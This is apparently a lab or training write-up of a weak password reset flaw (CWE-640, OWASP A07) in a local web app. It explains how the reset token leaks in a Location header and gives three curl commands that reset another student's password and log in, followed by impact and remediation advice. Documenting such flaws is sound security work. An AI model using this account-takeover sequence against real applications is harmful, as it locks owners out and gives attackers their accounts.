# Identification and Authentication Failures

## Category

OWASP A07:2021 – Identification and Authentication Failures.
WSTG-ATHN-09 – Weak Password Change or Reset Functionalities.
CWE-640 – Weak Password Recovery Mechanism for Forgotten Password.

## Location

http://localhost:4942/reset-password

## Discovery

In the Benjamin's post on Forum, he gave a hint about resetting passwords.
http://localhost:4942/forum/r8y1ib6ub8g47u2
"Locked myself out last night and used the password reset. The link worked instantly — no email, "
## Steps to Reproduce

1. Go to http://localhost:4942/reset-password
2. give one the student email (benjamin@student.42.tech for example)
3. enter a new password, validate and login with this email and new password

Alternatively, run `./exploit.sh` or execute the following commands in a terminal:

Request 1 — Request a password reset and retrieve the token from the `Location` header:
curl -i -sS \
  -X POST 'http://localhost:4942/reset-password/request' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'email=dorian@student.42.tech'

Request 2 — Confirm the new password with the received token.
Replace `<RECEIVED_TOKEN>` with the value of the `token=` parameter from the `Location` header in request 1:
curl -i -sS \
  -X POST 'http://localhost:4942/reset-password/confirm' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'email=dorian@student.42.tech' \
  --data-urlencode 'token=<RECEIVED_TOKEN>' \
  --data-urlencode 'new_password=TestPass1234'

Request 3 — Log in with the user's email and new password:
curl -i -sS -c cookies.txt \
  -X POST 'http://localhost:4942/login' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'identity=dorian@student.42.tech' \
  --data-urlencode 'password=TestPass1234'



## Security Assessment

The password recovery process must verify that the requester controls the registered email address before authorizing a password change.

Direct access to the password reset form is not a vulnerability by itself. The vulnerability is confirmed if the application authorizes the password change without independent verification of email ownership.

## Impact

If the password reset authorization is provided directly to an unverified requester, the recovery mechanism no longer establishes account ownership.

This may result in unauthorized password changes, account takeover and loss of access for the legitimate account owner.

## Cause

The password recovery workflow fails to enforce an independent verification step before authorizing the password change.

This weakness is distinct from predictable reset token generation: even a cryptographically secure random token would not protect the account if it were directly disclosed to an unverified requester.

## Remediation

- **Out-of-Band Verification:** Deliver password reset tokens exclusively through a verified recovery channel, such as the registered email address.
- **Server-Side Validation:** Require a valid reset token associated with the account before accepting any password modification.
- **Token Confidentiality:** Never disclose valid reset tokens in responses to unauthenticated password reset requests.
- **Single-Use & Short-Lived:** Enforce token expiration and invalidate tokens immediately after successful use.
- **Generic Responses:** Return a generic confirmation message after a password reset request to prevent account enumeration.
